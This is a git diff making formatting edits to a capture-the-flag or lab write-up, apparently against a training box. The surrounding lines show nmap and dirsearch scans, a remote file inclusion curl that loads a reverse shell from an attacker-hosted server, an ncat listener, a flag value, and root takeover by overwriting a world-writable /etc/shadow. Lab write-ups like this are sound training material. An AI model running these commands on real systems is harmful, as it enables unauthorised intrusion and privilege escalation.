@@ -29,6 +29,7 @@ $ sudo nmap -sS -sV -A -p22,80 -T4 -v -oN Nmap.md 10.150.150.18
 ```
 
 ---
+
 ### Web Directory Enumeration
 ```shell
 $ dirsearch -u http://10.150.150.18/ -t 25 -o dirsearch.md
@@ -49,6 +50,8 @@ curl http://10.150.150.18/README.md
 # basic-sample-php-template-example
 Explanation for organizing the file structure
 ```
+--- 
+
 ## Exploitation Phase
 ### Setting Up for RFI Exploitation
 1. Preparing reverse shell:
@@ -62,17 +65,19 @@ $ip = '10.66.67.198';
 $port = 1234;
 
 # Exploit Endpoint 
--> 'http://10.150.150.18/index.php?page=contact' 
+ -> 'http://10.150.150.18/index.php?page=contact' 
 # Exploitation payload 
--> curl 'http://10.150.150.18/index.php?page=http://10.66.67.198/shell'
+ -> curl 'http://10.150.150.18/index.php?page=http://10.66.67.198/shell'
 
 # start python http server 
-- python -m http.server 80 
+$ python -m http.server 80 
 # listing ncat listner 
-- rlwrap ncat -nvlp 1234 
+$ rlwrap ncat -nvlp 1234 
 # execute payload 
-- curl 'http://10.150.150.18/index.php?page=http://10.66.67.198/shell'
+$ curl 'http://10.150.150.18/index.php?page=http://10.66.67.198/shell'
 ```
+---
+
 ## Initial Access Enumeration
 
 After getting shell:
@@ -90,6 +95,8 @@ $ cat /home/snare/FLAG1.txt
 
 # Output: e335462da856f39997bffdc04b8d89ce1104fcc5
 ```
+---
+
 ## Privilege Escalation
 ### Enumeration for PE Vector
 
@@ -103,6 +110,7 @@ $ ls -la /etc/shadow
 
 ### Exploiting Shadow File
 1. On attacking machine:
+
 ```shell
 # Generate new password hash
 $ mkpasswd -m sha-512 Password@123
@@ -111,6 +119,7 @@ $ mkpasswd -m sha-512 Password@123
 # Create modified shadow file
 $ nano shadow
 # Replace root's hash with new hash
+
 ```
 
 2. On target machine:
